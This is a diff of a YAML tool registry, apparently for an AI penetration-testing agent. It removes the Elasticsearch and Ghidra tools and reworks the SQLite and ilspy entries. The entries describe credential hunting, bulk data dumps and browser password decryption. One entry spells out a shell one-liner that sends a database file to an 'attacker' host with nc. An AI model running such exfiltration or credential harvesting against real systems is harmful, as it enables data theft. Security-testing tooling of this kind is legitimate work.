@@ -1,5 +1,5 @@
 version: '2.0'
-updated_at: '2026-05-17T08:23:42Z'
+updated_at: '2026-05-17T15:37:16Z'
 tools:
   amass:
     name: amass
@@ -3979,188 +3979,6 @@ tools:
         by the image's build.
     - command: dig
       purpose: Bare invocation prints the dig usage summary (different from -h, less verbose).
-  elasticsearch:
-    name: elasticsearch
-    version: '1.0'
-    description: 'Elasticsearch enumeration and data extraction via REST API. 6 methods: cluster_info (version, health, nodes,
-      plugins), enum_indices (list all indices with doc counts and sizes), get_mappings (field schema for an index), search
-      (full Query DSL with pagination), dump (bulk extraction via scroll API — no 10K document limit), enum_snapshots (list
-      snapshot repos and backups). Connects to unauthenticated or Basic auth instances. For MongoDB use mongodb. For MySQL
-      use mysql.'
-    image: ghcr.io/silicon-works/mcp-tools-elasticsearch:latest
-    image_size_mb: 250
-    timeout_seconds: 600
-    capabilities:
-    - elasticsearch_enumeration
-    - data_extraction
-    - scroll_api
-    - cluster_reconnaissance
-    phases:
-    - enumeration
-    - post-exploitation
-    requirements:
-      network: true
-      privileged: false
-    resources:
-      memory_mb: 256
-      cpu: 0.5
-    routing:
-      use_for:
-      - enumerate Elasticsearch cluster info, indices, and mappings
-      - search Elasticsearch indices for credentials, PII, API keys, or sensitive data
-      - bulk dump data from Elasticsearch indices using scroll API
-      - enumerate Elasticsearch snapshot repositories for backup data
-      - probe unauthenticated Elasticsearch instances on port 9200
-      never_use_for:
-      - MongoDB databases (use mongodb)
-      - MySQL databases (use mysql)
-      - MSSQL databases (use mssql)
-      - port scanning to find Elasticsearch (use nmap)
-      triggers:
-      - elasticsearch
-      - elastic
-      - kibana
-      - port 9200
-      - ELK
-      - logstash
-      - elastic search
-      - ES cluster
-      prefer_over: []
-    see_also:
-    - tool: nmap
-      reason: Use nmap to discover Elasticsearch on port 9200/9300 before using elasticsearch tool.
-    - tool: curl
-      reason: Use curl for quick one-off ES API calls. Use elasticsearch for structured enumeration and bulk extraction with
-        scroll API.
-    - tool: mongodb
-      reason: Different NoSQL database. Use mongodb for MongoDB, elasticsearch for Elasticsearch.
-    methods:
-      cluster_info:
-        description: Get Elasticsearch cluster health, version, node info, and installed plugins. First step after discovering
-          ES.
-        when_to_use: After nmap discovers port 9200 — check if Elasticsearch is unauthenticated, identify version (for CVE
-          research), enumerate nodes and plugins.
-        params:
-          host:
-            type: string
-            required: true
-            description: Elasticsearch URL (e.g., 'http://10.10.10.5:9200').
-        returns:
-          cluster_name:
-            type: string
-            description: Cluster name.
-          version:
-            type: string
-            description: Elasticsearch version.
-          status:
-            type: string
-            description: Cluster health (green/yellow/red).
-          nodes:
-            type: array
-            description: Node information.
-      enum_indices:
-        description: List all indices with document count, size, and health status.
-        when_to_use: After confirming ES access — discover what data is stored. Look for indices named 'users', 'accounts',
-          'logs', 'emails', 'secrets', etc.
-        params:
-          host:
-            type: string
-            required: true
-            description: Elasticsearch URL.
-        returns:
-          indices:
-            type: array
-            description: Index details (name, status, health, doc count, size).
-          index_names:
-            type: array
-            description: Just the index names.
-      get_mappings:
-        description: Get field mappings for a specific index. Shows the schema — what fields exist and their types.
-        when_to_use: Before searching an index — understand its structure to craft targeted queries.
-        params:
-          host:
-            type: string
-            required: true
-            description: Elasticsearch URL.
-          index:
-            type: string
-            required: true
-            description: Index name.
-        returns:
-          mappings:
-            type: object
-            description: Index field mappings.
-      search:
-        description: Search an index using Elasticsearch Query DSL. Supports match_all, match, term, range, bool, and all
-          other Query DSL constructs.
-        when_to_use: Targeted data extraction — search for passwords, credentials, API keys, PII. Use match_all for overview,
-          match for keyword search, bool for complex queries.
-        params:
-          host:
-            type: string
-            required: true
-            description: Elasticsearch URL.
-          index:
-            type: string
-            default: _all
-            description: 'Index to search (default: all).'
-          query:
-            type: object
-            description: 'Query DSL (default: match_all). Example: {''match'': {''field'': ''password''}}.'
-          size:
-            type: integer
-            default: 20
-            description: Results per page.
-          from_offset:
-            type: integer
-            default: 0
-            description: Pagination offset.
-        returns:
-          documents:
-            type: array
-            description: Matching documents.
-          total:
-            type: integer
-            description: Total matching documents.
-      dump:
-        description: Bulk dump all documents from an index using the scroll API. Bypasses the default 10,000 document limit.
-        when_to_use: When you need ALL data from an index — full user databases, credential stores, log archives. Use max_docs
-          to limit output size.
-        params:
-          host:
-            type: string
-            required: true
-            description: Elasticsearch URL.
-          index:
-            type: string
-            required: true
-            description: Index to dump.
-          max_docs:
-            type: integer
-            default: 1000
-            description: Maximum documents to retrieve.
-        returns:
-          documents:
-            type: array
-            description: All dumped documents.
-          document_count:
-            type: integer
-            description: Number of documents retrieved.
-      enum_snapshots:
-        description: List snapshot repositories and their snapshots. Snapshots may contain older data or data from other indices.
-        when_to_use: Check for backup data that might contain credentials or historical records not in current indices.
-        params:
-          host:
-            type: string
-            required: true
-            description: Elasticsearch URL.
-        returns:
-          repositories:
-            type: array
-            description: Snapshot repository names.
-          snapshots:
-            type: object
-            description: Snapshots per repository.
   embedding:
     name: embedding
     version: '1.0'
@@ -5074,6 +4892,13 @@ tools:
     - tool: impacket
       reason: For impacket-* CLI binaries (secretsdump, psexec, etc.). exploit-runner ships the impacket Python LIBRARY for
         hand-rolled scripts only
+    - tool: sqlite
+      reason: 'Try `sqlite` (kind:cli v3.46, May 2026 Tier A flip) FIRST for simple SQLite extraction (list_tables / describe_table
+        / dump_table / find-credentials-candidates / arbitrary SQL queries). Escalate to exploit-runner only when sqlite3
+        CLI is insufficient: browser-specific encrypted password blobs (Firefox NSS in signons.sqlite needs pyasn1 + python-nss;
+        Chrome Login Data v10+ needs DPAPI/Keychain/Secret-Service decryption with cryptography library), multi-statement
+        migration scripts, or custom Python decoders for app-specific binary formats. exploit-runner ships the sqlite3 Python
+        stdlib + relevant decryption libraries pre-installed.'
     target_extraction: []
     reject_flags: []
     value_flags: []
@@ -5819,7 +5644,8 @@ tools:
       - OSINT pivot — extract GPS coordinates, camera serial, software-used from a photo
       - Verify file timestamps, creation tools, and PDF author/creator metadata during reconnaissance
       never_use_for:
-      - Reverse-engineering binary executables (use ghidra — forensics extracts files; ghidra analyzes code)
+      - Reverse-engineering binary executables (use exploit-runner with objdump/strings/radare2 — forensics extracts files;
+        exploit-runner analyzes code)
       - Memory forensics on RAM dumps (use volatility)
       - Network packet capture analysis (use wireshark / tshark)
       - Malware sandboxing / dynamic analysis (use dedicated malware tools)
@@ -5847,9 +5673,10 @@ tools:
       - matryoshka
       prefer_over: []
     see_also:
-    - tool: ghidra
-      reason: Use ghidra for reverse-engineering EXTRACTED binaries (e.g., a firmware ELF that binwalk pulled out of a router
-        image). Forensics extracts files; ghidra analyzes the code inside them.
+    - tool: exploit-runner
+      reason: Use exploit-runner with objdump/strings/radare2 for reverse-engineering EXTRACTED binaries (e.g., a firmware
+        ELF that binwalk pulled out of a router image). Forensics extracts files; exploit-runner analyzes the code inside
+        them.
     - tool: volatility
       reason: Use volatility for RAM-dump analysis (process listing, hashdump, filescan, registry hives). Forensics handles
         file-level / disk-level analysis. Memory dumps need volatility's address-space layer; foremost can carve PROCESS-MEMORY
@@ -6654,312 +6481,6 @@ tools:
           deleted:
             type: boolean
             description: Whether deletion succeeded.
-  ghidra:
-    name: ghidra
-    version: '12.0'
-    description: Ghidra reverse engineering framework for binary decompilation, disassembly, function analysis, and cross-reference
-      mapping. Converts machine code to readable C pseudocode. Powered by bethington/ghidra-mcp (headless mode, 128 tools
-      available via bridge).
-    image: ghcr.io/silicon-works/mcp-tools-ghidra:latest
-    image_size_mb: 1500
-    timeout_seconds: 600
-    capabilities:
-    - decompilation
-    - disassembly
-    - binary_analysis
-    - reverse_engineering
-    - cross_references
-    routing:
-      use_for:
-      - decompile binary to C code
-      - reverse engineer executable
-      - understand what a binary does
-      - analyze ELF binary functions
-      - find vulnerability in binary
-      - list functions in executable
-      - cross-reference analysis
-      - binary reverse engineering
-      - decompile SUID binary
-      - static binary analysis
-      never_use_for:
-      - port scanning
-      - web scanning
-      - running exploits
-      triggers:
-      - decompile
-      - reverse engineer
-      - ghidra
-      - disassemble
-      - binary analysis
-      prefer_over: []
-    phases:
-    - enumeration
-    - exploitation
-    requirements:
-      network: false
-      privileged: false
-    resources:
-      memory_mb: 4096
-      cpu: 2.0
-    methods:
-      load_binary:
-        description: Load a binary file from the filesystem into Ghidra and run auto-analysis. Call this first before using
-          other analysis methods — analysis can take 5-30s depending on binary size.
-        when_to_use: First step when you have a binary to analyze. Load it once, then use decompile_function, list_functions,
-          etc. repeatedly without waiting again.
-        params:
-          file:
-            type: string
-            required: true
-            description: Absolute path to the binary file (e.g., '/data/vuln', '/session/output/binary')
-        returns:
-          program:
-            type: string
-            description: Program name in Ghidra project
-      decompile_function:
-        description: Decompile a function to C pseudocode by name or address. Returns readable C code from machine code, making
-          it easy to identify vulnerabilities like buffer overflows, format strings, and logic flaws.
-        when_to_use: After identifying a potentially vulnerable function (from strings, symbols, or function list) to understand
-          its logic in C rather than reading raw assembly.
-        params:
-          name:
-            type: string
-            description: Function name to decompile (e.g., 'main', 'vuln'). Either name or address required.
-          address:
-            type: string
-            description: Function address in hex (e.g., '0x401234'). Alternative to name.
-          program:
-            type: string
-            description: Program name for multi-binary sessions
-        returns:
-          decompiled:
-            type: string
-            description: C pseudocode of the function
-      list_functions:
-        description: 'List all functions found in the binary with their addresses. Note: returns all functions regardless
-          of offset/limit in headless mode.'
-        when_to_use: First step when analyzing an unknown binary — get an overview of all functions to identify interesting
-          targets (main, custom functions, vulnerable-looking names like 'check_auth', 'handle_input').
-        params:
-          program:
-            type: string
-            description: Program name for multi-binary sessions
-        returns:
-          functions:
-            type: array
-            description: List of functions with name and address
-      search_functions_by_name:
-        description: Search for functions whose names contain a query string. Case-insensitive substring match.
-        when_to_use: When looking for functions related to specific behavior (e.g., search 'auth' to find authentication functions,
-          'buf' to find buffer-related functions).
-        params:
-          query:
-            type: string
-            required: true
-            description: Substring to search for in function names (e.g., 'auth', 'check', 'buf')
-          program:
-            type: string
-            description: Program name for multi-binary sessions
-        returns:
-          functions:
-            type: array
-            description: Matching functions with name and address
-      get_xrefs_to:
-        description: Get cross-references TO an address — shows what code calls or references this location.
-        when_to_use: To understand how a potentially vulnerable function is reached (call chain), or to find all callers of
-          a dangerous function like system(), execve(), strcpy().
-        params:
-          address:
-            type: string
-            required: true
-            description: Target address in hex (e.g., '0x401234')
-          offset:
-            type: integer
-            default: 0
-            description: Pagination offset
-          limit:
-            type: integer
-            default: 100
-            description: Maximum results to return
-          program:
-            type: string
-            description: Program name for multi-binary sessions
-        returns:
-          xrefs:
-            type: array
-            description: List of addresses/functions that reference this location
-      get_function_xrefs:
-        description: Get all cross-references to a function by name — easier than get_xrefs_to when you have a name, not an
-          address.
-        when_to_use: When you know a function name and want to find all callers without looking up its address first.
-        params:
-          name:
-            type: string
-            required: true
-            description: Function name to find references for
-          offset:
-            type: integer
-            default: 0
-            description: Pagination offset
-          limit:
-            type: integer
-            default: 100
-            description: Maximum results to return
-          program:
-            type: string
-            description: Program name for multi-binary sessions
-        returns:
-          xrefs:
-            type: array
-            description: List of references to the function
-      list_strings:
-        description: List all defined strings in the binary with their addresses. Finds URLs, passwords, error messages, format
-          strings, /bin/sh, and other interesting constants.
-        when_to_use: To find interesting strings (URLs, passwords, error messages, format strings, /bin/sh) and trace them
-          back to the functions that use them via xrefs.
-        params:
-          offset:
-            type: integer
-            default: 0
-            description: Pagination offset
-          limit:
-            type: integer
-            default: 100
-            description: Maximum strings to return
-          program:
-            type: string
-            description: Program name for multi-binary sessions
-        returns:
-          strings:
-            type: array
-            description: Strings with addresses
-      list_imports:
-        description: List imported functions (from libc, etc.) with their addresses. Shows what external functions the binary
-          uses.
-        when_to_use: To identify dangerous imports (gets, strcpy, printf, system) that indicate vulnerability types, and to
-          get addresses needed for ROP chains and GOT overwrite attacks.
-        params:
-          offset:
-            type: integer
-            default: 0
-            description: Pagination offset
-          limit:
-            type: integer
-            default: 100
-            description: Maximum results
-          program:
-            type: string
-            description: Program name for multi-binary sessions
-        returns:
-          imports:
-            type: array
-            description: Imported functions with names and addresses
-      list_exports:
-        description: List exported symbols from the binary.
-        when_to_use: To see what symbols the binary exports — useful for shared libraries or to find entry points.
-        params:
-          offset:
-            type: integer
-            default: 0
-            description: Pagination offset
-          limit:
-            type: integer
-            default: 100
-            description: Maximum results
-          program:
-            type: string
-            description: Program name for multi-binary sessions
-        returns:
-          exports:
-            type: array
-            description: Exported symbols with names and addresses
-      list_segments:
-        description: List memory segments (sections) of the binary with address ranges.
-        when_to_use: To understand memory layout — which segments are executable (for shellcode), writable (for overwrites),
-          or both (W+X = exploitable).
-        params:
-          program:
-            type: string
-            description: Program name for multi-binary sessions
-        returns:
-          segments:
-            type: array
-            description: Segments with name, address range
-      get_entry_points:
-        description: Get all entry point addresses for the binary.
-        when_to_use: To find the binary's entry point(s) — useful for stripped binaries where main() isn't easily identifiable.
-        params: {}
-        returns:
-          entry_points:
-            type: array
-            description: Entry point names and addresses
-      rename_function:
-        description: Rename a function to give it a more descriptive name.
-        when_to_use: After identifying what a function does, rename it for clarity (e.g., rename 'FUN_00401234' to 'vulnerable_strcpy_wrapper').
-        params:
-          old_name:
-            type: string
-            required: true
-            description: Current function name
-          new_name:
-            type: string
-            required: true
-            description: New function name
-        returns:
-          result:
-            type: string
-            description: Confirmation of rename
-      get_metadata:
-        description: Get metadata about the currently loaded program — name, path, architecture, compiler, image base address.
-        when_to_use: After loading a binary, to determine its architecture (x86, ARM, MIPS), compiler, and base address for
-          calculating offsets.
-        params: {}
-        returns:
-          metadata:
-            type: object
-            description: Program name, path, language, compiler, image_base, address_size
-      get_function_by_address:
-        description: Get function information by its address. Returns name, signature, and calling convention.
-        when_to_use: When you have a hex address (from xrefs, crash logs, or exploit output) and need to find which function
-          it belongs to.
-        params:
-          address:
-            type: string
-            required: true
-            description: Address in hex (e.g., '0x401234')
-        returns:
-          function:
-            type: object
-            description: Function name, address, signature, calling convention
-      get_function_variables:
-        description: List all variables in a function including parameters and locals.
-        when_to_use: To understand a function's stack layout — identify buffer sizes, variable types, and stack offsets needed
-          for buffer overflow exploits.
-        params:
-          function_name:
-            type: string
-            required: true
-            description: Function name to inspect
-        returns:
-          variables:
-            type: object
-            description: Function parameters and local variables with types
-      check_connection:
-        description: Verify the Ghidra server is running and responsive.
-        when_to_use: To check if Ghidra is ready before starting analysis, or to diagnose connection issues.
-        params: {}
-        returns:
-          status:
-            type: string
-            description: Connection status and server version
-      list_open_programs:
-        description: List all currently open programs in Ghidra.
-        when_to_use: When working with multiple binaries to see which programs are loaded and which is currently active.
-        params: {}
-        returns:
-          programs:
-            type: array
-            description: List of open program names with current indicator
   git-dumper:
     name: git-dumper
     kind: cli
@@ -8918,8 +8439,8 @@ tools:
       OFFLINE on local .NET assemblies (.dll, .exe, .winmd, .netmodule) inside the container — there is no network target.
       The positional argument is the ASSEMBLY PATH (e.g., `/session/output/ClientsBackup.dll`); flags like `-o`, `-t`, `--project`,
       `--ilcode`, `-l`, `-r` control output format, type filtering, project layout, and reference resolution. Native CLI;
-      the LLM constructs the full ilspycmd invocation. Produces clean C# source code far superior to Ghidra's .NET output.
-      For native binary analysis use ghidra. For .NET deserialization payloads use ysoserial.
+      the LLM constructs the full ilspycmd invocation. Produces clean C# source code for managed assemblies. For native binary
+      analysis use objdump/strings/radare2 via exploit-runner. For .NET deserialization payloads use ysoserial.
     image: ghcr.io/silicon-works/mcp-tools-ilspy:latest
     image_size_mb: 500
     idle_timeout_seconds: 600
@@ -8944,7 +8465,7 @@ tools:
       - produce a compilable .csproj from a .NET binary for offline study and modification
       - extract raw IL (intermediate language) from a .NET assembly
       never_use_for:
-      - native binary analysis (x86/ARM ELF/PE — use ghidra)
+      - native binary analysis (x86/ARM ELF/PE — use exploit-runner with objdump/strings/radare2)
       - task: generating .NET deserialization payloads
         use_instead: ysoserial
         reason: ilspy READS .NET binaries to recover source; it does not generate exploit payloads. After decompiling with
@@ -8969,8 +8490,7 @@ tools:
       - CLR assembly
       - MSIL
       - managed assembly
-      prefer_over:
-      - ghidra
+      prefer_over: []
     requirements:
       network: false
       privileged: false
@@ -8978,9 +8498,6 @@ tools:
       memory_mb: 512
       cpu: 0.5
     see_also:
-    - tool: ghidra
-      reason: Use ghidra for native binary analysis (ELF, PE x86/ARM). Use ilspy for .NET assemblies — it produces clean C#
-        source code superior to Ghidra's .NET output.
     - tool: ysoserial
       reason: After decompiling with ilspy to understand which formatter/gadget the target uses, run ysoserial to generate
         the deserialization payload.
@@ -8988,8 +8505,8 @@ tools:
       reason: Use mssql extract_assembly to retrieve .NET DLLs from MSSQL CLR assemblies, then decompile with ilspy to recover
         source and find credentials / logic flaws.
     - tool: exploit-runner
-      reason: For Java decompilation use exploit-runner with jadx or procyon; for native binaries pair with ghidra. ilspy
-        handles only .NET assemblies.
+      reason: For Java decompilation use exploit-runner with jadx or procyon; for native binaries use exploit-runner with
+        objdump/strings/radare2. ilspy handles only .NET assemblies.
     target_extraction: []
     reject_flags: []
     reject_flags_reason: ilspycmd has no network target and no target-list flag. The operands are a local .NET assembly file
@@ -9170,7 +8687,8 @@ tools:
     - Obfuscated assemblies often defeat the C# decompiler — output may be syntactically valid but semantically wrong, missing
       methods, or full of `goto` labels. Fall back to `--ilcode` to inspect raw IL when C# output looks suspect.
     - ilspy is .NET-ONLY. For Java (.jar/.class) use jadx or procyon (via exploit-runner). For native binaries (ELF, PE x86/ARM)
-      use ghidra. Trying to decompile a non-.NET file emits 'BadImageFormatException' or 'not a valid PE file' — see failure_signatures.
+      use objdump/strings/radare2 via exploit-runner. Trying to decompile a non-.NET file emits 'BadImageFormatException'
+      or 'not a valid PE file' — see failure_signatures.
     - Output is STATIC C# — re-compiling it does NOT necessarily produce a bit-identical assembly (some decompiler output
       is approximate, especially for compiler-generated state machines, anonymous types, and lambdas). Treat the output as
       a READ-ONLY analysis artifact unless you explicitly need a working rebuild.
@@ -9183,11 +8701,13 @@ tools:
         find file' — verify the path with `ls -l /session/<name>`.
     - signal: not a valid PE file
       remediation: Input file is not a Portable Executable (.dll / .exe / .winmd / .netmodule). ilspy only handles .NET assemblies.
-        Confirm the file type with `file /session/<name>` — for Java use jadx, for native binaries use ghidra.
+        Confirm the file type with `file /session/<name>` — for Java use jadx, for native binaries use objdump/strings/radare2
+        via exploit-runner.
     - signal: BadImageFormatException
       remediation: PE-loader exception — the file looks like a PE but isn't a valid managed (.NET) assembly. Could be a native
-        PE (use ghidra), a corrupted file, or a 32-vs-64-bit mismatch. Confirm with `file <path>` and check whether the file
-        actually is .NET (managed assemblies usually have `.NET assembly` in the file output, or a CLI Header in the PE).
+        PE (use objdump/strings/radare2 via exploit-runner), a corrupted file, or a 32-vs-64-bit mismatch. Confirm with `file
+        <path>` and check whether the file actually is .NET (managed assemblies usually have `.NET assembly` in the file output,
+        or a CLI Header in the PE).
     - signal: Could not resolve assembly
       remediation: Decompile referenced an external assembly that's not in the same directory and not in the bundled .NET
         reference assemblies. Stage the missing references alongside the input or pass `-r /path/to/refs/` (repeatable). Run
@@ -9219,7 +8739,8 @@ tools:
         with `ls -l <path>`. /session/ should always be readable and writable.
     - signal: is not a valid managed image
       remediation: 'Variant of ''BadImageFormatException'' / ''not a valid PE file'' — the file is not a managed (.NET) assembly.
-        Same fix: confirm the file type with `file <path>`; route to ghidra (native) or jadx (Java).'
+        Same fix: confirm the file type with `file <path>`; route to objdump/strings/radare2 via exploit-runner (native) or
+        jadx (Java).'
     help_commands:
     - command: ilspycmd --help
       purpose: Top-level help — full flag list, language values, project options, IL flags. Use to discover the right flag
@@ -11304,9 +10825,6 @@ tools:
     - tool: mssql
       reason: Different DB. Use mssql for Microsoft SQL Server (T-SQL, port 1433); mongodb for MongoDB (BSON, port 27017 default).
         Both expose enum + cred-hunt patterns; pick by what's open on the target.
-    - tool: elasticsearch
-      reason: Different NoSQL. Use elasticsearch for Elasticsearch indices (REST API, port 9200); mongodb for MongoDB collections.
-        Both unauth-friendly and credential-rich on misconfigured instances.
     - tool: hydra
       reason: If MongoDB requires auth and credentials are unknown, hydra's mongodb module brute-forces user/password pairs
         against the wire protocol. Run hydra first, then connect via this tool with the recovered creds.
@@ -11395,9 +10913,13 @@ tools:
         use_instead: shell-session OR exploit-runner (with mongo-tools binary)
         reason: this MCP wrapper drives the wire protocol; if you need binary mongodump for snapshot-and-go, run it via shell
           on a compromised host
-      - task: Microsoft SQL Server / PostgreSQL / MySQL / Elasticsearch enumeration
-        use_instead: mssql / curl-with-pg / mysql / elasticsearch
-        reason: wrong protocol entirely — mongodb is BSON-over-TCP-port-27017, the others are SQL or REST
+      - task: Microsoft SQL Server / PostgreSQL / MySQL enumeration
+        use_instead: mssql / curl-with-pg / mysql
+        reason: wrong protocol entirely — mongodb is BSON-over-TCP-port-27017, the others are SQL
+      - task: Elasticsearch / other REST-API databases
+        use_instead: curl
+        reason: Elasticsearch and similar REST-API stores are well-handled by curl + the ES REST API directly (GET /, /_cat/indices?v,
+          /index/_search). No dedicated MCP tool needed.
       triggers:
       - mongodb
       - '27017'
@@ -12937,6 +12459,11 @@ tools:
       reason: Use ssh (kind:cli) for one-shot remote command exec when credentials are known. nc connects to an arbitrary
         TCP port; ssh handles auth + remote-exec semantics. If the target is an SSH service and you have creds, ssh is the
         right tool.
+    - tool: sqlite
+      reason: 'Held-shell base64 exfil of a .sqlite/.db file: target runs `cat /path/db.sqlite | base64 -w0 | nc attacker
+        4444`; agent''s nc listener writes to /session/output/nc-recv/db.b64; then `sqlite` (kind:cli v3.46, May 2026 Tier
+        A) Pattern S0 base64-decodes + queries. Common path when ssh isn''t available (no credentials yet, or SSH outbound
+        blocked). Pairs with sqlite''s Pattern S0 (''base64-encoded DB → file → query'').'
     target_extraction:
     - rule: first_non_flag_positional
       pattern: ^([^:/?#\s]+)$
@@ -20808,16 +20335,20 @@ tools:
         a flag the agent wants to use.'
   sqlite:
     name: sqlite
-    version: '1.0'
-    description: 'SQLite database client (v3.46.1 with FTS5) for post-exploitation extraction of data from .db and .sqlite
-      files. Accepts database files by path (mounted volume) or base64-encoded content (downloaded from target via ssh/shell-session).
-      Includes automated credential hunting that pattern-matches table names (users, accounts, admin, login, members, employees)
-      and column names (password, hash, token, api_key, secret) to extract username/password pairs. Common targets: WordPress/Drupal
-      user databases, Firefox/Chrome stored credentials and history, mobile app databases, application config stores, session
-      databases, and any web framework using SQLite as backend.'
+    kind: cli
+    binary: sqlite3
+    version: 3.46.1
+    description: 'SQLite database client (v3.46.1 with FTS5, JSON output mode) via /usr/bin/sqlite3 CLI for post-exploitation
+      extraction of .db / .sqlite files. Stateless per-call: open DB → run SQL/PRAGMA → close. Common engagement use: WordPress/Drupal
+      wp_users tables, Firefox places.sqlite / cookies.sqlite / signons.sqlite, Chrome Login Data, mobile-app DBs, application
+      config + session stores. Migrated kind:mcp → kind:cli May 2026 (daemon-wrapper retirement series, Tier A; 621-LOC Python
+      wrapper collapsed to 22-LOC RunCliServer stub). For online RDBMS targets prefer mysql / mongodb / postgres; for SQL
+      injection use sqlmap.'
     image: ghcr.io/silicon-works/mcp-tools-sqlite:latest
-    image_size_mb: 100
-    timeout_seconds: 120
+    image_size_mb: 175
+    idle_timeout_seconds: 300
+    max_runtime_seconds: 300
+    timeout_seconds: 300
     capabilities:
     - database_extraction
     - credential_extraction
@@ -20842,10 +20373,12 @@ tools:
       - enumerate database schema tables columns row counts
       - execute SQL queries on local SQLite database file
       - mobile app database analysis Android iOS SQLite
+      - recover damaged or corrupted SQLite database via .recover
       never_use_for:
       - remote database access (use mysql or mongodb)
-      - SQL injection (use sqlmap)
+      - SQL injection testing (use sqlmap)
       - port scanning
+      - exfiltrating files from target (use ssh scp or nc held shell first, then run sqlite3 on the local copy)
       triggers:
       - SQLite
       - .db file
@@ -20853,200 +20386,263 @@ tools:
       - database file
       - local database
       - extract from database
-    methods:
-      query:
-        description: Execute an arbitrary SQL query on a SQLite database and return structured results. Supports any valid
-          SQLite SQL including SELECT, PRAGMA, and aggregate functions. Automatically appends LIMIT to SELECT queries that
-          don't already have one to prevent memory exhaustion on large tables. Returns column names and rows as dictionaries
-          for easy parsing.
-        when_to_use: 'When you need to run a specific SQL query that isn''t covered by the other convenience methods (list_tables,
-          describe_table, dump_table, find_credentials). Use for: custom JOINs across tables, aggregate queries (COUNT, GROUP
-          BY), LIKE/GLOB pattern searches for specific data, PRAGMA commands for database metadata, or any complex query.
-          Also use when you need to search for specific values (e.g., SELECT * FROM users WHERE role=''admin'').'
-        params:
-          database:
-            type: string
-            required: true
-            description: 'Path to SQLite database file inside the container (e.g., ''/data/app.db'' if volume-mounted), OR
-              base64-encoded database content if is_base64=true. For databases downloaded from target, use base64 encoding:
-              first download via ssh.download or shell-session, then pass the base64 content here.'
-          query:
-            type: string
-            required: true
-            description: 'SQL query to execute. Any valid SQLite SQL is accepted. SELECT queries without LIMIT get an automatic
-              LIMIT appended (controlled by limit param). Examples: ''SELECT * FROM users'', ''SELECT username, password FROM
-              accounts WHERE active=1'', ''PRAGMA table_info("users")'', ''SELECT name, sql FROM sqlite_master''.'
-          is_base64:
-            type: boolean
-            default: false
-            description: Set to true when the database parameter contains base64-encoded file content instead of a file path.
-              The server decodes it to a temp file, queries it, then cleans up.
-          limit:
-            type: integer
-            default: 1000
-            description: Maximum rows to return for SELECT queries. Auto-appended as 'LIMIT N' if the query doesn't already
-              contain a LIMIT clause. Set higher for large extractions.
-        returns:
-          columns:
-            type: array
-            description: Column names from the query result
-          rows:
-            type: array
-            description: 'Query results as array of dictionaries (column_name: value)'
-          row_count:
-            type: integer
-            description: Number of rows returned
-      list_tables:
-        description: List all tables in a SQLite database with row counts for each table. Queries sqlite_master for table
-          names and runs COUNT(*) on each. Provides a quick overview of database contents to guide further extraction.
-        when_to_use: First step when analyzing any SQLite database — run this to see what tables exist and how many rows each
-          contains before deciding what to extract. Large row counts in tables named 'users', 'accounts', 'sessions', 'logs'
-          etc. indicate high-value targets for extraction.
-        params:
-          database:
-            type: string
-            required: true
-            description: Path to SQLite database file, or base64-encoded content (set is_base64=true)
-          is_base64:
-            type: boolean
-            default: false
-            description: Set to true when database parameter contains base64-encoded file content
-        returns:
-          tables:
-            type: array
-            description: List of tables, each with 'name' and 'row_count' fields
-          count:
-            type: integer
-            description: Total number of tables in the database
-      describe_table:
-        description: Get detailed schema of a specific table using PRAGMA table_info(). Returns each column's name, data type,
-          NOT NULL constraint, default value, and whether it's a primary key. Also returns the table's row count.
-        when_to_use: 'After list_tables identifies interesting tables, use this to understand column structure before querying
-          or dumping. Helps identify: which columns contain credentials (password, hash, token), which columns are primary
-          keys for JOINs, data types for proper querying, and nullable fields.'
-        params:
-          database:
-            type: string
-            required: true
-            description: Path to SQLite database file, or base64-encoded content (set is_base64=true)
-          table:
-            type: string
-            required: true
-            description: Table name to describe (exact name as shown by list_tables)
-          is_base64:
-            type: boolean
-            default: false
-            description: Set to true when database parameter contains base64-encoded file content
-        returns:
-          columns:
-            type: array
-            description: 'Column definitions, each with: cid (column index), name, type (e.g., TEXT, INTEGER, BLOB), notnull
-              (boolean), default (default value or null), pk (boolean, is primary key)'
-          column_count:
-            type: integer
-            description: Number of columns in the table
-          row_count:
-            type: integer
-            description: Number of rows in the table
-      dump_table:
-        description: Extract rows from a specific table with optional column selection. Runs 'SELECT [columns] FROM table
-          LIMIT N' and returns results as dictionaries. Use the columns parameter to select only relevant columns (e.g., username
-          and password) instead of dumping everything.
-        when_to_use: After identifying interesting tables via list_tables or describe_table, use this to extract the actual
-          data. Prefer this over query for simple full-table or column-filtered extractions since it handles quoting and limiting
-          automatically. For credential tables, consider using find_credentials instead which auto-detects credential columns.
-        params:
-          database:
-            type: string
-            required: true
-            description: Path to SQLite database file, or base64-encoded content (set is_base64=true)
-          table:
-            type: string
-            required: true
-            description: Table name to dump (exact name as shown by list_tables)
-          columns:
-            type: array
-            description: Array of column names to select (e.g., ['username', 'password', 'email']). Omit to select all columns.
-              Use describe_table first to see available columns.
-          limit:
-            type: integer
-            default: 100
-            description: Maximum rows to return. Default 100. Increase for full extraction of small tables, keep low for initial
-              sampling of large tables.
-          is_base64:
-            type: boolean
-            default: false
-            description: Set to true when database parameter contains base64-encoded file content
-        returns:
-          columns:
-            type: array
-            description: Column names in the result set
-          rows:
-            type: array
-            description: 'Table contents as array of dictionaries (column_name: value)'
-          row_count:
-            type: integer
-            description: Number of rows returned (may be less than total if limited)
-      find_credentials:
-        description: Automatically search for credential-related data by pattern-matching table and column names. Scans table
-          names against 14 patterns (user, users, account, accounts, member, members, admin, admins, login, logins, auth,
-          credential, customer, employee) and column names against username patterns (username, user, login, email, name,
-          account, user_name, user_id) and password patterns (password, passwd, pass, pwd, hash, secret, token, api_key, apikey,
-          auth, credential). If no credential-pattern tables are found, falls back to searching ALL tables for credential-pattern
-          columns. Returns extracted username/password pairs with source table.
-        when_to_use: 'First thing to run on any database found during post-exploitation. Automatically identifies and extracts
-          credentials without needing to know the schema. Works on: CMS databases (WordPress wp_users, Drupal users), custom
-          web app databases, configuration stores, session databases. If this returns no results, fall back to list_tables
-          → describe_table → dump_table for manual analysis.'
-        params:
-          database:
-            type: string
-            required: true
-            description: Path to SQLite database file, or base64-encoded content (set is_base64=true)
-          is_base64:
-            type: boolean
-            default: false
-            description: Set to true when database parameter contains base64-encoded file content
-          limit:
-            type: integer
-            default: 100
-            description: Maximum rows to extract per matching table
-        returns:
-          credential_tables:
-            type: array
-            description: Table names that matched credential patterns (or all tables if no pattern matches found)
-          credentials:
-            type: array
-            description: Extracted credential data, each with 'table' (source table name) and matched column values (e.g.,
-              username, password, hash, email, token)
-          count:
-            type: integer
-            description: Total number of credential rows extracted across all tables
-      schema:
